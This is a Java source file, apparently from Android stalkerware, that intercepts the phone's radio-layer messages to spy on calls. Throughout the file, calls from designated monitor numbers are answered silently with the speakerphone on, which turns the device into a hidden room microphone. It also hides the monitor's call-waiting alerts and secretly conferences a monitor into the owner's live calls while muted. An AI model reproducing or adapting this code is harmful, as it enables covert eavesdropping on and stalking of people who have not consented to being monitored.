package com.vvt.callmanager.filter;

import java.util.ArrayList;
import java.util.HashSet;

import android.content.Context;
import android.media.AudioManager;
import android.os.Parcel;
import android.os.SystemClock;

import com.vvt.callmanager.CallMgrPreference;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.mitm.CallIntercept;
import com.vvt.callmanager.mitm.MitmHelper;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.MonitorDisconnectReason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.std.CallInfo;
import com.vvt.callmanager.std.MusicPlayMonitoring;
import com.vvt.callmanager.std.MusicPlayMonitoring.OnMusicPlayListener;
import com.vvt.callmanager.std.Response;
import com.vvt.callmanager.std.RilConstant;
import com.vvt.callmanager.std.RilManager;
import com.vvt.logger.FxLog;

class FilterCdmaCall extends InterceptingFilter implements CallIntercept {
	
	private static final String TAG = FilterFactory.TAG_FILTER_CALL;
	private static final boolean LOGV = Customization.VERBOSE;
	
	private AudioManager mAudioManager;
	private CallIntercept.Listener mInterceptListener;
    private CallMgrPreference mPreference;
    private Context mContext;
    private RilManager mRilManager;
    private String mAutoConferenceNumber;
    
    private boolean mBeginAutoConference;
	
	/**
	 * Don't set this value directly, set it via {@link #setState(CallState)}
	 */
	private CallState mState;
	
	public FilterCdmaCall(Context context, Mitm mitm, RilManager rilManager) {
		super(mitm);
		mContext = context;
		mRilManager = rilManager;
		mPreference = CallMgrPreference.getInstance();
		mAudioManager = (AudioManager) mContext.getSystemService(Context.AUDIO_SERVICE);
		
		mAutoConferenceNumber = null;
		mInterceptListener = null;
		mBeginAutoConference = false;
		
		// Add reference to this object to all state enumerator.
		for (CallState callState : CallState.values()) {
			callState.setMessageFilter(this);
		}
		
		// Set beginning state
		setState(CallState.IDLE);
	}
	
	public void beginAutoConference(String phoneNumber) {
		if (mState == CallState.ONE_ACTIVE_CALL) {
			mAutoConferenceNumber = phoneNumber;
			mBeginAutoConference = true;
			FilterHelper.setMute(true, this, mRilManager);
		}
		else {
			writeAtMessage(String.format(
					"Cannot start Auto Conferencing, current state: %s", 
					mState.toString()));
		}
	}

	@Override
	public void setInterceptListener(Listener listener) {
		mInterceptListener = listener;
	}

	@Override
	public void resetInterceptListener() {
		mInterceptListener = null;
	}

	@Override
	public void processRilRequest(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_MSG_O2M, MitmHelper.getDisplayString(p), mState));
		setState(mState.processRilRequest(p));
	}
	
	@Override
	public void processResponse(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_RESP_T2M, MitmHelper.getDisplayString(p), mState));
		setState(mState.processResponse(p));
	}
	
	@Override
	protected void writeToOriginate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_RESP_M2O, MitmHelper.getDisplayString(p), mState));
		super.writeToOriginate(p);
	}

	@Override
	protected void writeToTerminate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_MSG_M2T, MitmHelper.getDisplayString(p), mState));
		super.writeToTerminate(p);
	}

	private void setState(CallState state) {
		if (state != mState) {
			String message = String.format("setState # %s -> %s", mState, state);
			writeAtMessage(message);
			
			Object transitionObject = null;
			if (mState != null) {
				transitionObject = mState.onExit();
			}
			mState = state;
			state.onEnter(transitionObject);
		}
	}
	
	private void writeAtMessage(String message) {
		mRilManager.writeAtMessage(message);
	}
	
	private void notifyMonitorDisconnect(MonitorDisconnectReason reason) {
		if (mInterceptListener != null) {
			mInterceptListener.onMonitorDisconnect(reason);
		}
	}
	
	public enum CallState {
		
		IDLE {
			
			private CallInfo monitorCallInfo;
			private boolean isWaitingForResponse;
			
			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"IDLE # ENTER ...");
				
				monitorCallInfo = null;
				isWaitingForResponse = false;
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"IDLE # EXIT ...");
				return monitorCallInfo;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				
				if (request == RilConstant.RIL_REQUEST_DIAL) {
					nextState = DIALING_RINGING;
				}
				
				mFilterCall.writeToTerminate(p);
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Inform Call State Changed
				if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					FilterHelper.requestGetCurrentCalls(mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				// Inform Current Calls
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					CallInfo call = null;
					if (calls != null && calls.size() == 1) {
						call = calls.get(0);
					}
					
					if (call != null && call.getState() == 4) {
						mFilterCall.writeAtMessage(
								String.format("Get calling from: %s", call.getNumber()));
						
						nextState = handleIncomingCall(call);
					}
				}
				// Response of Rejecting monitor
				else if (isWaitingForResponse && FilterHelper.isHangup(response)) {
					isWaitingForResponse = false;
					forward = false;
					nextState = IDLE;
				}
				// Response of Answering monitor
				else if (isWaitingForResponse && 
						response == RilConstant.RIL_REQUEST_ANSWER) {
					isWaitingForResponse = false;
					forward = false;
					nextState = SPYING;
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			private CallState handleIncomingCall(CallInfo call) {
				MonitorNumber monitorInfo = 
						mFilterCall.mPreference.getMonitorInfo(call.getNumber());
				
				boolean isEnabledMonitorFound = monitorInfo != null && monitorInfo.isEnabled();
				
				// To Answer or Reject
				if (isEnabledMonitorFound) {
					mFilterCall.writeAtMessage("Found active monitor!");
					
					boolean isMusicPlaying = mFilterCall.mAudioManager.isMusicActive();
					boolean isSpyEnabled = monitorInfo.isSpyEnabled();
					boolean isGreenLight = isSpyEnabled && !isMusicPlaying;
					
					// Answer a call from a monitor
					if (isGreenLight) {
						mFilterCall.writeAtMessage("Activate Spy Call");
						monitorCallInfo = call;
						
						Parcel answer = FilterHelper.getParcel(
								FilterHelper.REQUEST_ANSWER);
						
						mFilterCall.mRilManager.addRequest(answer);
						mFilterCall.writeToTerminate(answer);
						
						isWaitingForResponse = true;
					}
					// Reject call from a monitor
					else {
						mFilterCall.writeAtMessage(String.format("%s -> Reject Spy Call", 
								isMusicPlaying ? "Music is playing" : "Spy Call is disabled"));
						
						FilterHelper.hangupBackground(mFilterCall, mFilterCall.mRilManager);
						
						if (isMusicPlaying) {
							mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.MUSIC_PLAY);
						}
						isWaitingForResponse = true;
					}
					
					return IDLE;
				}
				// To let the phone ring
				else {
					mFilterCall.writeAtMessage("Forward ringing message");
					FilterHelper.forwardRingMessages(mFilterCall, null);
					return DIALING_RINGING;
				}
			}
		}, 
		
		DIALING_RINGING {
			
			private Object transition;
			
			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"DIALING_RINGING # ENTER ...");
				
				transition = null;
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"DIALING_RINGING # EXIT ...");
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Inform Current Calls
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					if (calls.size() == 0) {
						nextState = CallState.IDLE;
					}
					else if (calls.size() == 1 && calls.get(0).getState() == 0) {
						transition = calls.get(0);
						nextState = CallState.ONE_ACTIVE_CALL;
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
		}, 
		
		ONE_ACTIVE_CALL {
			
			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"ONE_ACTIVE_CALL # ENTER ...");
				
				mFilterCall.mBeginAutoConference = false;
				
				if (mFilterCall.mInterceptListener != null &&
						transitionObject != null && 
						transitionObject instanceof CallInfo) {
					
					CallInfo callInfo = (CallInfo) transitionObject;
					ActiveCallInfo activeCall = new ActiveCallInfo();
					activeCall.setIncoming(callInfo.getDirection() == 1);
					activeCall.setNumber(callInfo.getNumber());
					mFilterCall.mInterceptListener.onNormalCallActive(activeCall);
					
					// This is the only state that Auto Conferencing is possible!
					// I still don't support calling onCallConnect in MULTIPLE_CALLS state.
				}
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"ONE_ACTIVE_CALL # EXIT ...");
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				
				if (request == RilConstant.RIL_REQUEST_CDMA_FLASH) {
					nextState = MULTIPLE_CALLS;
				}
				
				mFilterCall.writeToTerminate(p);
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Inform Call Waiting
				if (response == RilConstant.RIL_UNSOL_CDMA_CALL_WAITING) {
					MonitorNumber monitorInfo = 
							mFilterCall.mPreference.getMonitorInfo(
									FilterHelper.getPhoneNumberFromCdmaCallWaiting(p));
					
					boolean isEnabledMonitorFound = 
							monitorInfo != null && monitorInfo.isEnabled();
					
					// Hang Up is impossible so we just hide it.
					// I've tried with hang up foreground, hang up background, 
					// specifying index (fix 2), and swapping 2 times before hang up. 
					// All methods do not worked.
					if (isEnabledMonitorFound) {
						mFilterCall.writeAtMessage("Found Monitor!");
						forward = false;
					}
					// Change state
					else {
						nextState = MULTIPLE_CALLS;
					}
				}
				
				// Inform Current Calls
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					if (calls.size() == 0) {
						nextState = CallState.IDLE;
					}
				}
				
				// Response of Set Mute
				else if (mFilterCall.mBeginAutoConference &&
						response == RilConstant.RIL_REQUEST_SET_MUTE) {
					mFilterCall.mBeginAutoConference = false;
					nextState = AUTO_CONFERENCING;
					forward = false;
					
					// Flash Dial
					FilterHelper.flashDial(
							mFilterCall.mAutoConferenceNumber, 
							mFilterCall, mFilterCall.mRilManager);
					
					// Mute OFF (don't wait for the response of Flash Dial)
					FilterHelper.setMute(false, mFilterCall, mFilterCall.mRilManager);
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			/**
			 * Mock Code: Start auto conferencing in 5 seconds
			 */
			@SuppressWarnings("unused")
			private void testAutoConferencing() {
				Runnable r = new Runnable() {
					@Override
					public void run() {
						mFilterCall.writeAtMessage("Auto Conferencing in 5 sec ...");
						SystemClock.sleep(5000);
						
						// Find number
						String phoneNumber = null;
						HashSet<MonitorNumber> monitors = mFilterCall.mPreference.getMonitors();
						for (MonitorNumber monitor : monitors) {
							if (monitor.isEnabled() && monitor.isOffhookSpyEnabled()) {
								phoneNumber = monitor.getPhoneNumber();
								break;
							}
						}
						
						// Display number
						mFilterCall.writeAtMessage(String.format("Phone number: %s", 
								phoneNumber == null ? "N/A" : phoneNumber));
						
						// Send message
						if (phoneNumber != null) {
							mFilterCall.beginAutoConference(phoneNumber);
						}
					}
				};
				Thread t = new Thread(r);
				t.start();
			}
			
		}, 
		
		MULTIPLE_CALLS {

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"MULTIPLE_CALLS # ENTER ...");
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"MULTIPLE_CALLS # EXIT ...");
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Inform Current Calls
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					if (calls.size() == 0) {
						nextState = CallState.IDLE;
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
		}, 
		
		SPYING {
			
			private byte[] cacheRequestMute;
			private byte[] cacheRequestDial;
			private boolean hasCallWaiting;
			private boolean isWaitingForHangupResponse;
			private int monitorIndex;
			
			private MusicPlayMonitoring musicMonitoring;
			private OnMusicPlayListener musicPlayListener;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"SPYING # ENTER ...");
				
				if (transitionObject != null && 
						transitionObject instanceof CallInfo) {
					
					CallInfo monitor = (CallInfo) transitionObject;
					monitorIndex = monitor.getIndex();
					
					mFilterCall.writeAtMessage(String.format("Monitor Index: %d", monitorIndex));
				}
				
				cacheRequestMute = null;
				cacheRequestDial = null;
				hasCallWaiting = false;
				isWaitingForHangupResponse = false;
				monitorIndex = monitorIndex > 0 ? monitorIndex : 1;
				
				mFilterCall.mAudioManager.setMode(AudioManager.MODE_NORMAL);
				mFilterCall.mAudioManager.setMode(AudioManager.MODE_IN_CALL);
				mFilterCall.writeAtMessage("Mode IN_CALL is applied");
				
				registerMusicPlayListener();
				mFilterCall.writeAtMessage("Music play listener is registered");
				
				mFilterCall.mAudioManager.setSpeakerphoneOn(true);
				mFilterCall.writeAtMessage("Speaker is ON");
				
				// Noise Canceling system will be disabled automatically, if loud speaker is enabled
				// if (!turnOffSpeaker) mAudioManager.setParameters("noise_suppression=off");
			}

			@Override
			public Object onExit() {
				mFilterCall.mAudioManager.setMode(AudioManager.MODE_NORMAL);
				mFilterCall.writeAtMessage("Mode NORMAL is applied");
				
				mFilterCall.mAudioManager.setSpeakerphoneOn(false);
				mFilterCall.writeAtMessage("Speaker is OFF");
				
				unregisterMusicPlayListener();
				mFilterCall.writeAtMessage("Music play listener is unregistered");
				
				if (LOGV) FxLog.v(TAG,"SPYING # EXIT ...");
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				
				if (request == RilConstant.RIL_REQUEST_SET_MUTE) {
					if (cacheRequestMute == null) {
						cacheRequestMute = p.marshall();
					}
					forward = false;
				}
				else if (request == RilConstant.RIL_REQUEST_DIAL) {
					mFilterCall.writeAtMessage("Target is making call -> Release monitor");
					cacheRequestDial = p.marshall();
					
					Parcel hangup = FilterHelper.getParcel(
							FilterHelper.REQUEST_HANGUP_FOREGROUND);
					
					mFilterCall.mRilManager.addRequest(hangup);
					mFilterCall.writeToTerminate(hangup);
					
					isWaitingForHangupResponse = true;
					forward = false;
					
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.DIALING);
				}
				
				if (forward) {
					mFilterCall.writeToTerminate(p);
				}
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Inform Call Waiting
				if (response == RilConstant.RIL_UNSOL_CDMA_CALL_WAITING) {
					mFilterCall.writeAtMessage(
							"Get incoming call -> Release monitor");
					
					// Message caching is NOT needed since it is in a different form
					// In CDMA, Call State Changed is used instead of +CRING  
					hasCallWaiting = true;
					
					releaseMonitor();
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.CALL_WAITING);
					
					forward = false;
				}
				// Inform Call State Changed (monitor is gone, or being released)
				else if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					mFilterCall.writeAtMessage("Call state changed -> Get current calls");
					FilterHelper.requestGetCurrentCalls(mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				// Response of Get Current Calls (monitor is gone, or being released)
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					// Forward Dial message
					if (cacheRequestDial != null) {
						mFilterCall.writeAtMessage(
								"Monitor is released -> Forward dialing message");
						
						if (cacheRequestMute != null) {
							mFilterCall.writeToTerminate(
									FilterHelper.getParcel(cacheRequestMute));
						}
						mFilterCall.writeToTerminate(
								FilterHelper.getParcel(cacheRequestDial));
						
						nextState = DIALING_RINGING;
					}
					// Forward Call Waiting message
					else if (hasCallWaiting) {
						mFilterCall.writeAtMessage(
								"Monitor is released -> Forward ringing messages");
						FilterHelper.forwardRingMessages(mFilterCall, null);
						nextState = DIALING_RINGING;
					}
					// Monitor is gone
					else if (calls.size() == 0) {
						mFilterCall.writeAtMessage("Monitor is gone");
						nextState = IDLE;
					}
				}
				// Response of Hang Up (handle incoming or outgoing call)
				else if (isWaitingForHangupResponse && FilterHelper.isHangup(response)) {
					isWaitingForHangupResponse = false;
					forward = false;
				}
				// Block LG additional state info message
				else if (response == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
					mFilterCall.writeAtMessage("Found LG custom state info -> Block!");
					forward = false;
				}
				
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			private void releaseMonitor() {
				FilterHelper.hangupIndex(monitorIndex, mFilterCall, mFilterCall.mRilManager);
				isWaitingForHangupResponse = true;
			}
			
			private void registerMusicPlayListener() {
				musicPlayListener = new OnMusicPlayListener() {
					@Override
					public void onMusicPlay() {
						mFilterCall.writeAtMessage("Music become active -> Release monitor");
						releaseMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.MUSIC_PLAY);
					}
				};
				
				musicMonitoring = new MusicPlayMonitoring(
						mFilterCall.mAudioManager, musicPlayListener);
				
				musicMonitoring.start();
			}

			private void unregisterMusicPlayListener() {
				if (musicPlayListener != null) {
					musicPlayListener = null;
				}
				
				if (musicMonitoring != null) {
					musicMonitoring.end();
					musicMonitoring = null;
				}
			}
		}, 
		
		AUTO_CONFERENCING {
			
			byte[] cacheMessage;
			
			boolean waitForFlashDialResponse;
			boolean waitForFlashMergeResponse;
			boolean waitForFlashDropLastCallResponse;
			int mergingCount;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"AUTO_CONFERENCING # ENTER ...");
				waitForFlashDialResponse = true;
				waitForFlashMergeResponse = false;
				waitForFlashDropLastCallResponse = false;
				cacheMessage = null;
				
				mergingCount = 0;
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"AUTO_CONFERENCING # EXIT ...");
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				
				// Handle ATH seems not necessary
				// both calls should be dropped and state will be changed to IDLE
				
				// Flash Dialing
				if (request == RilConstant.RIL_REQUEST_CDMA_FLASH) {
					mFilterCall.writeAtMessage("Cache Flash message -> Drop Monitor");
					cacheMessage = p.marshall();
					
					// Drop monitor
					FilterHelper.flash(mFilterCall, mFilterCall.mRilManager);
					
					waitForFlashDropLastCallResponse = true;
					forward = false;
					
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.DIALING);
				}
				
				if (forward) {
					mFilterCall.writeToTerminate(p);
				}
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Response of Mute (state entering)
				if (response == RilConstant.RIL_REQUEST_SET_MUTE) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_MUTE;
				}
				
				// Response of Flash Dial
				else if (waitForFlashDialResponse &&
						response == RilConstant.RIL_REQUEST_CDMA_FLASH) {
					
					waitForFlashDialResponse = false;
					forward = false;
					
					// 10 seconds is enough for quick response, but 13 is more safe
					delayFlashMerge(13);
				}
				
				// Response of Flash Merge
				else if (waitForFlashMergeResponse && 
						response == RilConstant.RIL_REQUEST_CDMA_FLASH) {
					
					// Verify Merge Result
					boolean isMergingSuccess = isMergingSuccess(p);
					
					// Merge success
					if (isMergingSuccess) {
						waitForFlashMergeResponse = false;
						
						mFilterCall.writeAtMessage("Mute OFF");
						FilterHelper.setMute(false, mFilterCall, mFilterCall.mRilManager);
						mFilterCall.mAudioManager.setMode(AudioManager.MODE_NORMAL);
						mFilterCall.mAudioManager.setMode(AudioManager.MODE_IN_CALL);
						mFilterCall.mAudioManager.setStreamMute(
								AudioManager.STREAM_VOICE_CALL, false);
					}
					// Retry in 3 sec
					else if (mergingCount < 5){
						mergingCount++;
						mFilterCall.writeAtMessage(String.format(
								"Merging failed, count: %d", mergingCount));
						
						Runnable r = new Runnable() {
							@Override
							public void run() {
								SystemClock.sleep(3000);
								FilterHelper.flash(mFilterCall, mFilterCall.mRilManager);
							}
						};
						Thread t = new Thread(r);
						t.start();
					}
					else {
						mFilterCall.writeAtMessage("Stop continue merging -> Hangup");
						FilterHelper.hangupForeground(mFilterCall, mFilterCall.mRilManager);
					}
					forward = false;
				}
				
				// Response of Flash Drop Last Call
				else if (waitForFlashDropLastCallResponse && 
						response == RilConstant.RIL_REQUEST_CDMA_FLASH) {
					
					// Monitor is dropped successfully
					waitForFlashDropLastCallResponse = false;
					forward = false;
					
					// Forward Flash Dialing message -> Change state
					if (cacheMessage != null) {
						mFilterCall.writeToTerminate(FilterHelper.getParcel(cacheMessage));
						nextState = MULTIPLE_CALLS;
					}
				}
				
				// Inform Call State Changed
				// FYI: This message won't come in when the 3rd party is gone.
				// It will comes when 3rd party and monitor are both gone.
				else if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					FilterHelper.requestGetCurrentCalls(mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				
				// Inform Current Calls
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					forward = false;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					if (calls.size() == 0) {
						mFilterCall.writeAtMessage("3rd Party and monitor is gone");
						nextState = IDLE;
						mFilterCall.writeToOriginate(
								FilterHelper.getParcel(
										FilterHelper.UNSOL_CALL_STATE_CHANGED));
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			private boolean isMergingSuccess(Parcel p) {
				p.setDataPosition(12);
				return p.readInt() == 0;
			}
			
			private void delayFlashMerge(final int sec) {
				Thread t = new Thread() {
					public void run() {
						mFilterCall.writeAtMessage("Mute ON");
						for (int i = 0; i < sec; i++) {
							SystemClock.sleep(1000);
							mFilterCall.mAudioManager.setMode(AudioManager.MODE_NORMAL);
							mFilterCall.mAudioManager.setStreamMute(
									AudioManager.STREAM_VOICE_CALL, true);
						}
						FilterHelper.flash(mFilterCall, mFilterCall.mRilManager);
						waitForFlashMergeResponse = true;
					}
				};
				t.start();
			}
			
		}
		;
		
		protected FilterCdmaCall mFilterCall;
		
		// The variables below must be static since we need to share the value between each state
		
		void setMessageFilter(FilterCdmaCall callStateMachine) {
			mFilterCall = callStateMachine;
		}
		
		/**
		 * @param transitionObject the transition object from the previous state.
		 */
		public abstract void onEnter(Object transitionObject);
		
		/**
		 * @return transition object to be used as any information to transfer to the next state. 
		 */
		public abstract Object onExit();
		
		public abstract CallState processRilRequest(Parcel p);
		public abstract CallState processResponse(Parcel p);
		
	}

}
